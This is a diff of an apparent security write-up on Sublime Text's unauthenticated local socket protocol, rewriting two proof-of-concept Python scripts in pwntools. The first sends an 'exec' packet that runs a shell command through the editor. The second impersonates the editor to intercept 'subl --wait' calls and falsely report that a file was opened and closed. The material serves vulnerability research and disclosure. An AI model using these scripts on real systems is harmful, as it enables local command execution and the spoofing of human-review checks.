@@ -68,22 +68,24 @@ There is no authentication in this protocol. No token, no challenge, no session 
 I wrote a small script to send the `exec` command directly:
 
 ```python
-import socket, struct, glob
+from pwn import *
+import glob
+
+context.endian = 'little'
 
 sock_path = glob.glob("/tmp/Sublime Text.*.sock")[0]
-cmd = 'exec {"shell_cmd": "id > /tmp/from_socket.txt"}'
-cmd_b = cmd.encode()
+cmd = b'exec {"shell_cmd": "id > /tmp/from_socket.txt"}'
 
 payload = (
-    struct.pack('<II', 9, 0) +
-    struct.pack('<Q', 0) +
-    struct.pack('<II', 1, len(cmd_b)) +
-    cmd_b + b'\x00' * 16
+    p32(9) + p32(0) +   # type=9, flags=0 (command)
+    p64(0) +            # padding
+    p32(1) + p32(len(cmd)) +
+    cmd + b'\x00' * 16
 )
 
 s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
 s.connect(sock_path)
-s.sendall(struct.pack('<Q', len(payload)) + payload)
+s.sendall(p64(len(payload)) + payload)
 s.close()
 ```
 
@@ -151,16 +153,20 @@ The assumption is that exit=0 means a human opened the file, read it, and closed
 The `--wait` mode uses `flags=1` in the protocol. The string payload is the file path. A fake server receives it like this:
 
 ```python
-hdr = conn.recv(8)
-pkt_len = struct.unpack('<Q', hdr)[0]
-data = conn.recv(pkt_len)
+from pwn import *
 
-flags   = struct.unpack('<I', data[4:8])[0]   # 1 = file open (--wait)
-str_len = struct.unpack('<I', data[8:12])[0]
+context.endian = 'little'
+
+hdr     = conn.recv(8)
+pkt_len = u64(hdr)
+data    = conn.recv(pkt_len)
+
+flags   = u32(data[4:8])    # 1 = file open (--wait)
+str_len = u32(data[8:12])
 path    = data[12:12+str_len].decode().rstrip('\x00')
 
-# You now have the file path and can return whatever exit code you want
-conn.sendall(struct.pack('<QI', 4, 0))   # exit=0
+# return exit=0 immediately — caller never knows nobody opened the file
+conn.sendall(p64(4) + p32(0))
 ```
 
 I confirmed this works. A process sitting on the socket can intercept `subl --wait` calls, read the file path from the packet (and the file contents if they are readable), and return any exit code immediately.
